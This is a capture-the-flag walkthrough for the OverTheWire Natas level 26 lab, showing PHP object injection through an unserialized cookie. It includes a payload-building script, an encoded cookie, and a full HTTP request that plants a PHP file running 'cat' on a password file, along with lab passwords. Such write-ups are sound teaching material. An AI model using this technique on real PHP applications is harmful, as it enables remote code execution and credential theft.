- This is one of those levels which I found pretty tough to exploit, however the exploit came out to be really simple
- This level leverages our knowledge of PHP's `serialize()` and `unserialize()` methods, and the skills to exploit them
- Here's a small excerpt from the PHP Manual about `serialize()` and `deserialize()`
	- `serialize`: Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. To make the serialized string into a PHP value again, use [unserialize()](https://www.php.net/manual/en/function.unserialize.php).
	- `deserialize`: **unserialize()** takes a single serialized variable and converts it back into a PHP value.
- There's also a big warning about the `unserialize()` method, a small excerpt of it is as follows:
> Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this

- So we are going to exploit this`unserialize()` method in our approach
- Let's have a look at the mimic source code first:
```php
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
<body>
<?php
// sry, this is ugly as hell.
// cheers kaliman ;)
// - morla
class Logger{
	private $logFile;
	private $initMsg;
	private $exitMsg;
	
	function __construct($file){
		// initialise variables
		$this->initMsg="#--session started--#\n";
		$this->exitMsg="#--session end--#\n";
		$this->logFile = "/tmp/natas26_" . $file . ".log";
		// write initial message
		$fd=fopen($this->logFile,"a+");
		fwrite($fd,$this->initMsg);
		fclose($fd);
	}

	function log($msg){
		$fd=fopen($this->logFile,"a+");
		fwrite($fd,$msg."\n");
		fclose($fd);
	}

	function __destruct(){
		// write exit message
		$fd=fopen($this->logFile,"a+");
		fwrite($fd,$this->exitMsg);
		fclose($fd);
	}

}

function showImage($filename){
	if(file_exists($filename))
		echo "<img src=\"$filename\">";
}

function drawImage($filename){
	$img=imagecreatetruecolor(400,300);
	drawFromUserdata($img);
	imagepng($img,$filename);
	imagedestroy($img);
}

function drawFromUserdata($img){
	if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) && array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
		$color=imagecolorallocate($img,0xff,0x12,0x1c);
		imageline($img,$_GET["x1"], $_GET["y1"],
		$_GET["x2"], $_GET["y2"], $color);
	}

	if (array_key_exists("drawing", $_COOKIE)){
		$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
		if($drawing)
			foreach($drawing as $object)
				if( array_key_exists("x1", $object) &&
				array_key_exists("y1", $object) &&
				array_key_exists("x2", $object) &&
				array_key_exists("y2", $object)){
				$color=imagecolorallocate($img,0xff,0x12,0x1c);
				imageline($img,$object["x1"],$object["y1"], $object["x2"] ,$object["y2"] ,$color);
				}

	}
}

function storeData(){
	$new_object=array();
	if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
	array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
		$new_object["x1"]=$_GET["x1"];
		$new_object["y1"]=$_GET["y1"];
		$new_object["x2"]=$_GET["x2"];
		$new_object["y2"]=$_GET["y2"];
	}

	if (array_key_exists("drawing", $_COOKIE)){
		$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
	}
	else{
		// create new array
		$drawing=array();
	}
	$drawing[]=$new_object;
	setcookie("drawing",base64_encode(serialize($drawing)));
}
?>
<h1>natas26</h1>
<div id="content">
  
Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form>
<?php
session_start();
if (array_key_exists("drawing", $_COOKIE) ||
	( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
	array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
		$imgfile="img/natas26_" . session_id() .".png";
		drawImage($imgfile);
		showImage($imgfile);
		storeData();
}
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```
- Going through the source code, we see that it draws an image using the specified coordinates from the GET request done by the user. Also, it reads the cookie, decodes it and draws coordinates from there too. And once that is done, it stores the coordinates in the cookie for further reading
- However, no checks are performed for validating what data is being unserialized, so we can exploit the same
- Our main point of interest is the `Logger` class which has been written in the code but isn't used anywhere.
```php
class Logger{
	private $logFile;
	private $initMsg;
	private $exitMsg;
	
	function __construct($file){
		// initialise variables
		$this->initMsg="#--session started--#\n";
		$this->exitMsg="#--session end--#\n";
		$this->logFile = "/tmp/natas26_" . $file . ".log";
		// write initial message
		$fd=fopen($this->logFile,"a+");
		fwrite($fd,$this->initMsg);
		fclose($fd);
	}

	function log($msg){
		$fd=fopen($this->logFile,"a+");
		fwrite($fd,$msg."\n");
		fclose($fd);
	}

	function __destruct(){
		// write exit message
		$fd=fopen($this->logFile,"a+");
		fwrite($fd,$this->exitMsg);
		fclose($fd);
	}

}
```
- After going through the docs of `unserialize()` method, I observed that once the object is deserialized, the method `__destruct()` is called, and here in our case the `__destruct()` method opens up a log file, writes something to it, and closes it afterwards
- So if we somehow change the `logFile` and the `exitMsg` of the instance which we are unserializing, then we can create a PHP file on the server side with our arbitrary content, thereby reading the password for the next level
- Hence for this level, it would be better to have a PHP script of our own that can can provide us the serialized data which we can then send in a cookie which will be unserialized in the code
- We can write a script as follows:
```php
<?php
class Logger{
	private $logFile;
	private $initMsg;
	private $exitMsg;
	function __construct($file){
		// initialise variables
		$this->initMsg="";
		$this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27'); ?>";
		$this->logFile = "/var/www/natas/natas26/img/pass_exploit.php";
	}

	function log($msg){
	}

	function __destruct(){
	}
}
$instance = new Logger('lol');
echo serialize($instance)."\n";
echo base64_encode(serialize($instance))."\n";
?>
```
- In this script, I've copied the exact same definition of the `Logger` class that was present in our mimic source code, and just modified the values of `exitMsg` and `logFile` property. I've created a log file in the img directory that will contain the PHP exploit code (in our case to extract the password for next level, however we can also do RCE)
- When we run this script, we get the following output:
```text
O:6:"Logger":3:{s:15:"LoggerlogFile";s:43:"/var/www/natas/natas26/img/pass_exploit.php";s:15:"LoggerinitMsg";s:0:"";s:15:"LoggerexitMsg";s:52:"<?php passthru('cat /etc/natas_webpass/natas27'); ?>";}
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvcGFzc19leHBsb2l0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUyOiI8P3BocCBwYXNzdGhydSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9
```
- The first line contains the serialized data of the logger class, and the second line contains the same data in base64 encoded format, the one in which our cookie is stored
- We can just copy paste the same data in our cookie, and send the request as follows:
```http
GET / HTTP/1.1
Host: natas26.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyNjpjVlhYd3hNUzNZMjZuNVVaVTg5UWdwR21XQ2VsYVFsRQ==
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Cookie: drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MzoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvcGFzc19leHBsb2l0LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUyOiI8P3BocCBwYXNzdGhydSgnY2F0IC9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8%2bIjt9

```
- For this we get the following response:
```text
:  Uncaught Error: Cannot use object of type Logger as array in /var/www/natas/natas26/index.php:105
Stack trace:
#0 /var/www/natas/natas26/index.php(131): storeData()
#1 {main}
```
- This implies that our `Logger` class object was unserialized successfully, and also the `__destruct()` method must have been called, thereby adding our PHP exploit code in the file that we specified
- We then navigate to the following URL:
```url
http://natas26.natas.labs.overthewire.org/img/pass_exploit.php
```
- And boom! our password is present in the file. 
- Note: Sometimes the file isn't created in the first request, so sending the request again creates it and adds the password in it
- Obtained password: u3RRffXjysjgwFU6b9xa23i6prmUsYne